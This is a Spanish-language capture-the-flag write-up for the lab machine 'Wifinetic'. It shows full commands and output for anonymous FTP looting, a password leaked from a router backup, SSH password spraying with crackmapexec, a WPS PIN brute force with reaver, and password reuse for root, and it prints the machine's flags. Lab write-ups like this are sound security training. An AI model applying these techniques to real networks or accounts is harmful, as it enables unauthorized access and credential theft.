---
layout: post
title: Wifinetic
date: 2023-09-23
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Wifinetic-htb/Wifinetic.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos


***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.247 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 15:14 GMT
Nmap scan report for 10.10.11.247
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p21,22,53 10.10.11.247 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 15:14 GMT
Nmap scan report for 10.10.11.247
Host is up (0.057s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```

## Puerto 21 (FTP)

Puedo conectarme como el usuario ```anonymous```

```null
ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:rubbx): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||43538|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
```

Descargo todos los archivos

```null
ftp> prompt off
Interactive mode off.
ftp> mget *
```

Extraigo los archivos del comprimido

```null
7z l backup-OpenWrt-2023-07-26.tar

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)

Scanning the drive for archives:
1 file, 40960 bytes (40 KiB)

Listing archive: backup-OpenWrt-2023-07-26.tar

--
Path = backup-OpenWrt-2023-07-26.tar
Type = tar
Physical Size = 40960
Headers Size = 19968
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-09-11 15:23:33 D....            0            0  ./etc
2023-09-11 15:22:02 D....            0            0  ./etc/config
2023-07-26 10:07:15 .....          438          512  ./etc/config/system
2023-07-26 10:10:55 .....          735         1024  ./etc/config/wireless
2023-07-26 10:10:55 .....         2555         2560  ./etc/config/firewall
2023-07-24 21:53:16 .....          388          512  ./etc/config/network
2023-07-24 19:15:22 .....          783         1024  ./etc/config/uhttpd
2023-04-27 20:28:15 .....          134          512  ./etc/config/dropbear
2023-04-27 20:28:15 .....          788         1024  ./etc/config/ucitrack
2023-04-27 20:28:15 .....          167          512  ./etc/config/rpcd
2023-07-24 19:15:22 .....          959         1024  ./etc/config/dhcp
2023-07-24 19:15:22 .....          968         1024  ./etc/config/luci
2023-07-24 19:15:22 .....          121          512  ./etc/uhttpd.key
2023-07-24 19:15:22 .....          745         1024  ./etc/uhttpd.crt
2023-04-27 20:28:15 .....           80          512  ./etc/sysctl.conf
2023-04-27 20:28:15 .....          183          512  ./etc/inittab
2023-07-26 10:08:52 .....          227          512  ./etc/group
2023-09-11 15:22:02 D....            0            0  ./etc/opkg
2023-09-11 15:22:02 D....            0            0  ./etc/opkg/keys
2023-04-27 20:28:15 .....          118          512  ./etc/opkg/keys/4d017e6f1ed5d616
2023-04-27 20:28:15 .....          110          512  ./etc/hosts
2023-07-26 10:09:38 .....          420          512  ./etc/passwd
2023-04-27 20:28:15 .....          475          512  ./etc/shinit
2023-04-27 20:28:15 .....          132          512  ./etc/rc.local
2023-09-11 15:22:02 D....            0            0  ./etc/dropbear
2023-07-24 19:15:22 .....           83          512  ./etc/dropbear/dropbear_ed25519_host_key
2023-07-24 19:15:22 .....          804         1024  ./etc/dropbear/dropbear_rsa_host_key
2023-04-27 20:28:15 .....            9          512  ./etc/shells
2023-04-27 20:28:15 .....         1046         1536  ./etc/profile
2023-09-11 15:22:02 D....            0            0  ./etc/nftables.d
2023-04-27 20:28:15 .....         1139         1536  ./etc/nftables.d/10-custom-filter-chains.nft
2023-04-27 20:28:15 .....          197          512  ./etc/nftables.d/README
2023-09-11 15:22:02 D....            0            0  ./etc/luci-uploads
2023-04-27 20:28:15 .....            0            0  ./etc/luci-uploads/.placeholder
------------------- ----- ------------ ------------  ------------------------
2023-09-11 15:23:33              13804        20992  27 files, 7 folders
```

Corresponde al directorio ```/etc``` de la máquina víctima. Desde el ```passwd``` puedo ver los usuarios

```null
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

En el archivo ```/etc/config/wireless``` se leakea una contraseña

```null
config wifi-device 'radio0'
    option type 'mac80211'
    option path 'virtual/mac80211_hwsim/hwsim0'
    option cell_density '0'
    option channel 'auto'
    option band '2g'
    option txpower '20'

config wifi-device 'radio1'
    option type 'mac80211'
    option path 'virtual/mac80211_hwsim/hwsim1'
    option channel '36'
    option band '5g'
    option htmode 'HE80'
    option cell_density '0'

config wifi-iface 'wifinet0'
    option device 'radio0'
    option mode 'ap'
    option ssid 'OpenWrt'
    option encryption 'psk'
    option key 'VeRyUniUqWiFIPasswrd1!'
    option wps_pushbutton '1'

config wifi-iface 'wifinet1'
    option device 'radio1'
    option mode 'sta'
    option network 'wwan'
    option ssid 'OpenWrt'
    option encryption 'psk'
    option key 'VeRyUniUqWiFIPasswrd1!'
```

Con los usuarios de antes aplico fuerza bruta por SSH

```null
cat passwd | awk '{print $1}' FS=":" > ../../users.txt
```

```null
crackmapexec ssh 10.10.11.247 -u ../../users.txt -p 'VeRyUniUqWiFIPasswrd1!'
SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] daemon:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ftp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] nobody:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] dnsmasq:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] logd:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ubus:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1!  - shell access!
```

Gano acceso como ```netadmin```. Puedo ver la primera flag

```null
ssh netadmin@10.10.11.247
The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.247' (ED25519) to the list of known hosts.
netadmin@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 23 Sep 2023 09:02:31 AM UTC

  System load:  0.14              Users logged in:        0
  Usage of /:   78.3% of 4.76GB   IPv4 address for eth0:  10.10.11.247
  Memory usage: 14%               IPv4 address for wlan0: 192.168.1.1
  Swap usage:   0%                IPv4 address for wlan1: 192.168.1.23
  Processes:    232


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 22 21:55:37 2023 from 10.10.14.128
netadmin@wifinetic:~$ cat user.txt 
69910f1ce66df93d5740ba00ad3bf3e4
```

# Escalada

Tengo interfaces wifi asignadas

```null
netadmin@wifinetic:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:1f:33 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.247/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:1f33/64 scope link 
       valid_lft forever preferred_lft forever
3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 brd 192.168.1.255 scope global wlan0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:0/64 scope link 
       valid_lft forever preferred_lft forever
4: wlan1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.23/24 brd 192.168.1.255 scope global dynamic wlan1
       valid_lft 39620sec preferred_lft 39620sec
    inet6 fe80::ff:fe00:100/64 scope link 
       valid_lft forever preferred_lft forever
5: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
6: hwsim0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
7: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
```

Si examino los binarios con capabilities, encuentro uno que me permite interceptar tráfico

```null
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

La única interfaz que está en modo monitor es la ```mon0```

```null
netadmin@wifinetic:~$ iwconfig 
lo        no wireless extensions.

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
hwsim0    no wireless extensions.

eth0      no wireless extensions.

wlan1     IEEE 802.11  ESSID:"OpenWrt"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00   
          Bit Rate:1 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:2   Missed beacon:0
```

Puedo aplicar fuerza bruta sobre el protocolo WPS al enrutador que aparece en esa interfaz

```null
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

La contraseña se reutiliza para el usuario ```root```. Puedo ver la segunda flag

```null
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# cat /root/root.txt 
c8731ac59dfca3ea9f30c398018c3ea8
```